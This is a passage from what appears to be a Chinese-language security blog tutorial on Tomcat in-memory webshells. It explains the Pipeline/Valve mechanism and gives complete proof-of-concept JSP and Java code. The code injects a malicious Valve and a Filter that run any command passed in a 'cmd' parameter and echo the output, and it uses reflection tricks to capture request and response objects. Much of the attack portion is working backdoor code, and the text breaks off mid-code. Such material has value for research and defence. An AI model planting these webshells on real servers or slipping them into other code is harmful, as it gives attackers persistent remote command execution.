class="string">&quot;/shell&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>先注册Servlet</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/Java_Shell_war_exploded/Servlet.jsp</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010647020.png"                      alt="image-20230201064710941"                ><figcaption>image-20230201064710941</figcaption></figure></p><blockquote><p>Servlet型内存马的缺点就是必须要访问对应的路径才能命令执行，易被发现。</p></blockquote><h3 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h3><p>需要先了解一下tomcat中的管道机制</p><p>Tomcat 在处理一个请求调用逻辑时需要传递Request 和 Respone 对象，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。</p><p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010646623.png"                      alt="image-20230201064647521"                ><figcaption>image-20230201064647521</figcaption></figure></p><blockquote><p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p></blockquote><h4 id="动态添加Valve"><a href="#动态添加Valve" class="headerlink" title="动态添加Valve"></a>动态添加Valve</h4><p>先来简单看一下接口的定义，<code>org.apache.catalina.Pipeline</code> 的定义如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Pipeline</span> <span class="keyword">extends</span> <span class="title class_">Contained</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getBasic</span><span class="params">()</span>;<span class="comment">//获取基础阀门</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBasic</span><span class="params">(Valve valve)</span>;<span class="comment">//设置基础阀门</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span>;<span class="comment">//增加阀门*</span></span><br><span class="line">    <span class="keyword">public</span> Valve[] getValves();<span class="comment">//获取</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeValve</span><span class="params">(Valve valve)</span>;<span class="comment">//移除</span></span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getFirst</span><span class="params">()</span>;<span class="comment">//获取首个</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;<span class="comment">//是否支持异步*</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findNonAsyncValves</span><span class="params">(Set&lt;String&gt; result)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>org.apache.catalina.Valve</code> 的定义如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getNext</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span>;<span class="comment">//设置下一个阀门</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span><span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Tomcat 中 Pipeline 仅有一个实现 StandardPipeline，存放在 ContainerBase 的 pipeline 属性中，并且 ContainerBase 提供 <code>addValve</code> 方法调用 StandardPipeline 的 addValve 方法添加。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Contained) &#123;</span><br><span class="line">        ((Contained) valve).setContainer(<span class="built_in">this</span>.container);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (getState().isAvailable()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((Lifecycle) valve).start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardPipeline.valve.start&quot;</span>), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">null</span>) &#123;</span><br><span class="line">        first = valve;</span><br><span class="line">        valve.setNext(basic);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Valve</span> <span class="variable">current</span> <span class="operator">=</span> first;</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (current.getNext() == basic) &#123;</span><br><span class="line">                current.setNext(valve);</span><br><span class="line">                valve.setNext(basic);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            current = current.getNext();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>Tomcat 中四个层级的容器都继承了 ContainerBase ，所以在哪个层级的容器的标准实现上添加自定义的 Valve 均可。</p></blockquote><p>添加后，将会在 <code>org.apache.catalina.connector.CoyoteAdapter</code> 的 <code>service</code> 方法中调用 Valve 的 <code>invoke</code> 方法。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(org.apache.coyote.Request req, org.apache.coyote.Response res)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        postParseSuccess = postParseRequest(req, request, res, response);</span><br><span class="line">        <span class="keyword">if</span> (postParseSuccess) &#123;</span><br><span class="line">            request.setAsyncSupported(</span><br><span class="line">                    connector.getService().getContainer().getPipeline().isAsyncSupported());</span><br><span class="line">            connector.getService().getContainer().getPipeline().getFirst().invoke(</span><br><span class="line">                    request, response);<span class="comment">//调用invoke</span></span><br></pre></td></tr></table></figure></div><p>这样思路就很清晰了，我们只要写一个恶意Valve为了方便可以继承<code>ValveBase</code>，然后将恶意代码写在invoke方法中,之后只要先通过<code>StandardContext</code>对象获取<code>StandardPipeline</code>，这样就可以利用<code>StandardPipeline.addValve()</code>动态添加Valve</p><h4 id="完整POC-2"><a href="#完整POC-2" class="headerlink" title="完整POC"></a>完整POC</h4><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Pipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> standardContext.getPipeline();</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Shell_Valve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Valve</span> <span class="variable">shell_valve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Valve</span>();</span><br><span class="line">    pipeline.addValve(shell_valve);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>加载Valve</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/Java_Shell_war_exploded/Valve.jsp</span><br></pre></td></tr></table></figure></div><p>之后可以任意路径命令执行</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010705853.png"                      alt="image-20230201070553758"                ><figcaption>image-20230201070553758</figcaption></figure></p><h2 id="0x02-内存马回显技术"><a href="#0x02-内存马回显技术" class="headerlink" title="0x02 内存马回显技术"></a>0x02 内存马回显技术</h2><h3 id="回显示例"><a href="#回显示例" class="headerlink" title="回显示例"></a>回显示例</h3><p>可以利用之前的Tomcat Filter型内存马获取回显,修改一下恶意Filter</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//将命令执行结果写入扫描器并读取所有输入</span></span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext()?scanner.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                scanner.close();</span><br><span class="line">                writer.write(result);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010710660.png"                      alt="image-20230201071005531"                ><figcaption>image-20230201071005531</figcaption></figure></p><h3 id="ThreadLocal-Response回显"><a href="#ThreadLocal-Response回显" class="headerlink" title="ThreadLocal Response回显"></a>ThreadLocal Response回显</h3><p>实验环境:Tomcat 9.0.77 (Tomcat10后部分源码逻辑修改,以及一些反射使用会报NullPointerException)</p><p>如果用Tomcat的内存马，需要JSP文件，当我们需要反序列化漏洞来注入内存马是，需要其他的方法获取request和response对象。</p><p>首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息。最终我们能够在<code>org.apache.catalina.core.ApplicationFilterChain</code>类中找到这样两个变量*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ApplicationFilterChain</span> <span class="keyword">implements</span> <span class="title class_">FilterChain</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br></pre></td></tr></table></figure></div><blockquote><p>并且这两个属性还是静态的,默认赋值</p></blockquote><p>在<code>ApplicationFilterChain#internalDoFilter</code>中，Tomcat会将request对象和response对象存储到这两个变量中</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,ServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">    lastServicedRequest.set(request);</span><br><span class="line">    lastServicedResponse.set(response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div><blockquote><p>这里有一个条件<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>,默认值为false，但可以反射修改</p></blockquote><p>总结一下思路</p><ol><li>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的值，通过<code>ThreadLocal#set</code>方法将request和response对象存储到变量中</li><li>初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</li><li>通过<code>ThreadLocal#get</code>方法将request和response对象从*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*中取出</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebServlet(&quot;/echo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tomcat_Echo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//反射获取所需属性</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//使用modifiersField反射修改final型变量</span></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量</span></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>))&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (lastServicedRequestField.get(<span class="literal">null</span>)==<span class="literal">null</span>)&#123;</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (lastServicedResponseField.get(<span class="literal">null</span>)==<span class="literal">null</span>)&#123;</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取request变量</span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequestField.get(<span class="literal">null</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> (ServletRequest) threadLocal.get();</span><br><span class="line">                System.out.println(servletRequest);</span><br><span class="line">                System.out.println((HttpServletRequest) servletRequest == req);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>第一次请求将request和response对象存储进变量中，第二次请求才获取到request</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(servletRequest);</span><br><span class="line">System.out.println((HttpServletRequest) servletRequest == req);</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010824372.png"                      alt="image-20230201082439227"                ><figcaption>image-20230201082439227</figcaption></figure></p><h3 id="通过全局存储Response回显"><a href="#通过全局存储Response回显" class="headerlink" title="通过全局存储Response回显"></a>通过全局存储Response回显</h3><h4 id="Tomcat-9-0-55-Tomcat9-0-71废除了org-apache-catalina-loader-WebappClassLoaderBas-getResources"><a href="#Tomcat-9-0-55-Tomcat9-0-71废除了org-apache-catalina-loader-WebappClassLoaderBas-getResources" class="headerlink" title="Tomcat:9.0.55 (Tomcat9.0.71废除了org.apache.catalina.loader.WebappClassLoaderBas.getResources)"></a>Tomcat:9.0.55 (Tomcat9.0.71废除了org.apache.catalina.loader.WebappClassLoaderBas.getResources)</h4><p>在<code>AbstractProcessor</code>类中，我们能够找到全局response,在Tomcat调用栈中调用了<code>Http11Processor#service</code>方法,而<code>Http11Processor</code>继承了<code>AbstractProcessor</code>类，这里的response对象正是<code>AbstractProcessor</code>类中的属性，因此我们如果能获取到<code>Http11Processor</code>类，就能获取到response对象</p><p>调用链</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StandardService-----&gt;Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;<span class="built_in">this</span>.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response</span><br></pre></td></tr></table></figure></div><p>完整poc</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 